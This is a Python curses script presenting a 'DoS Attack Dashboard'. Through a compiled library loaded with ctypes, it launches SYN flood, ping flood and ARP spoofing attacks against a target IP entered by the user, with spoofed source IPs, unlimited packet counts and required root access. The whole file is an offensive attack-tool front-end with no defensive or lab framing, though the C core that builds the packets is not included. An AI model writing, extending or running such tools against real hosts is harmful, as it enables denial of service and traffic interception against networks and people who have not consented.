#!/usr/bin/env python3
"""
DoS Attack Dashboard - curses TUI
"""
import curses
import ctypes
import os
import subprocess
import sys
import signal
from ctypes import c_char_p, c_int, POINTER, Structure, byref

LIB_PATH = "./libdos.so"
if not os.path.exists(LIB_PATH):
    sys.exit("[!] libdos.so not found.\n"
             "Compile: gcc -O2 -shared -fPIC -o libdos.so dos_core.c -lpthread")

lib = ctypes.CDLL(LIB_PATH)

class AttackConfig(ctypes.Structure):
    _fields_ = [
        ("attack_type", c_char_p),
        ("target",      c_char_p),
        ("source_ip",   c_char_p),
        ("gateway_ip",  c_char_p),
        ("num_packets", c_int),
        ("iface",       c_char_p),
    ]

class AttackHandle(ctypes.Structure): pass

lib.start_attack.restype = POINTER(AttackHandle)
lib.stop_attack.argtypes = [POINTER(AttackHandle)]

attacks = []  # list of handles

def get_default_iface():
    try:
        out = subprocess.check_output(
            "ip -o -4 addr show scope global | head -1 | awk '{print $2}'",
            shell=True, text=True).strip()
        if out: return out
    except: pass
    try:
        out = subprocess.check_output(
            "ls /sys/class/net | grep -v lo | head -1",
            shell=True, text=True).strip()
        if out: return out
    except: pass
    return "eth0"

def list_interfaces():
    try:
        return subprocess.check_output("ip -br link", shell=True, text=True).strip()
    except:
        return "N/A"

def start_attack(atype, target, source=None, gateway=None, count=0, iface=None):
    iface = iface or get_default_iface()
    cfg = AttackConfig(
        attack_type = atype.encode(),
        target      = target.encode(),
        source_ip   = source.encode() if source else None,
        gateway_ip  = gateway.encode() if gateway else None,
        num_packets = count,
        iface       = iface.encode(),
    )
    handle = lib.start_attack(byref(cfg))
    if handle:
        attacks.append(handle)
        return handle
    else:
        return None

def stop_attack_handle(handle):
    if handle in attacks:
        attacks.remove(handle)
        lib.stop_attack(handle)

def stop_all():
    for h in list(attacks):
        stop_attack_handle(h)

def safe_exit(stdscr):
    curses.endwin()
    print("All attacks stopped.")
    sys.exit(0)

def draw_menu(stdscr, current_row, menu_items):
    h, w = stdscr.getmaxyx()
    # عنوان
    title = "🚀 DoS Attack Dashboard - TUI 🚀"
    stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
    stdscr.addstr(0, max(0, w//2 - len(title)//2), title)
    stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)

    # منو
    start_y = 2
    for idx, item in enumerate(menu_items):
        x = w//2 - len(item)//2
        y = start_y + idx
        if idx == current_row:
            stdscr.attron(curses.A_REVERSE | curses.color_pair(2))
            stdscr.addstr(y, x, item)
            stdscr.attroff(curses.A_REVERSE | curses.color_pair(2))
        else:
            stdscr.attron(curses.color_pair(2))
            stdscr.addstr(y, x, item)
            stdscr.attroff(curses.color_pair(2))

    # حملات فعال
    stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
    stdscr.addstr(2, 2, "Active Attacks:")
    stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)
    for i, h in enumerate(attacks):
        stdscr.addstr(3 + i, 4, f"Attack {i}: Handle {h}")

    # راهنما
    help_text = "↑↓: Navigate   Enter: Select   q: Quit   i: Interface info"
    stdscr.attron(curses.color_pair(4))
    stdscr.addstr(h-1, max(0, w//2 - len(help_text)//2), help_text)
    stdscr.attroff(curses.color_pair(4))
    stdscr.refresh()

def get_input(stdscr, prompt, y, x):
    curses.echo()
    stdscr.addstr(y, x, prompt)
    stdscr.refresh()
    input_str = stdscr.getstr(y, x + len(prompt), 40).decode('utf-8').strip()
    curses.noecho()
    return input_str

def show_message(stdscr, msg, color_pair=4):
    h, w = stdscr.getmaxyx()
    stdscr.attron(curses.color_pair(color_pair))
    stdscr.addstr(h-2, max(0, w//2 - len(msg)//2), msg)
    stdscr.attroff(curses.color_pair(color_pair))
    stdscr.refresh()
    curses.napms(2000)

def main(stdscr):
    # راه‌اندازی رنگ‌ها
    curses.curs_set(0)  # مخفی کردن نشانگر
    curses.start_color()
    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_WHITE, curses.COLOR_BLACK)

    menu_items = [
        "1. SYN Flood Attack",
        "2. Ping Flood Attack",
        "3. ARP Spoof Attack",
        "4. Stop All Attacks",
        "5. Exit",
    ]
    current_row = 0

    while True:
        stdscr.clear()
        draw_menu(stdscr, current_row, menu_items)

        key = stdscr.getch()

        if key == curses.KEY_UP and current_row > 0:
            current_row -= 1
        elif key == curses.KEY_DOWN and current_row < len(menu_items)-1:
            current_row += 1
        elif key == ord('q'):
            stop_all()
            safe_exit(stdscr)
        elif key == ord('i'):
            interfaces = list_interfaces()
            show_message(stdscr, f"Interfaces: {interfaces}", 4)
        elif key == ord('\n'):  # Enter
            if current_row == 0:  # SYN flood
                stdscr.clear()
                target = get_input(stdscr, "Target IP: ", 5, 5)
                source = get_input(stdscr, "Source IP (Enter for random): ", 7, 5)
                count_str = get_input(stdscr, "Packet count (0=infinite): ", 9, 5)
                count = int(count_str) if count_str else 0
                iface = get_input(stdscr, f"Interface (default {get_default_iface()}): ", 11, 5)
                res = start_attack("syn_flood", target, source, None, count, iface)
                if res:
                    show_message(stdscr, f"SYN flood started on {target} (handle {res})", 3)
                else:
                    show_message(stdscr, "Failed to start SYN flood. Check interface/permissions.", 4)
            elif current_row == 1:  # Ping flood
                stdscr.clear()
                target = get_input(stdscr, "Target IP: ", 5, 5)
                count_str = get_input(stdscr, "Packet count (0=infinite): ", 7, 5)
                count = int(count_str) if count_str else 0
                res = start_attack("ping_flood", target, None, None, count, None)
                if res:
                    show_message(stdscr, f"Ping flood started on {target}", 3)
                else:
                    show_message(stdscr, "Failed. Are you root?", 4)
            elif current_row == 2:  # ARP spoof
                stdscr.clear()
                target = get_input(stdscr, "Target IP: ", 5, 5)
                gateway = get_input(stdscr, "Gateway IP: ", 7, 5)
                count_str = get_input(stdscr, "Packet count (0=infinite): ", 9, 5)
                count = int(count_str) if count_str else 0
                iface = get_input(stdscr, f"Interface (default {get_default_iface()}): ", 11, 5)
                res = start_attack("arp_spoof", target, None, gateway, count, iface)
                if res:
                    show_message(stdscr, f"ARP spoof started on {target}", 3)
                else:
                    show_message(stdscr, "Failed. Check gateway/interface.", 4)
            elif current_row == 3:  # Stop all
                stop_all()
                show_message(stdscr, "All attacks stopped.", 3)
            elif current_row == 4:  # Exit
                stop_all()
                safe_exit(stdscr)
        # آپدیت منو بعد از عملیات
        stdscr.clear()
        draw_menu(stdscr, current_row, menu_items)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Please run as root (sudo python3 cli.py)")
        sys.exit(1)
    # سیگنال‌ها برای توقف امن
    signal.signal(signal.SIGINT, lambda sig, frame: stop_all() or sys.exit(0))
    curses.wrapper(main)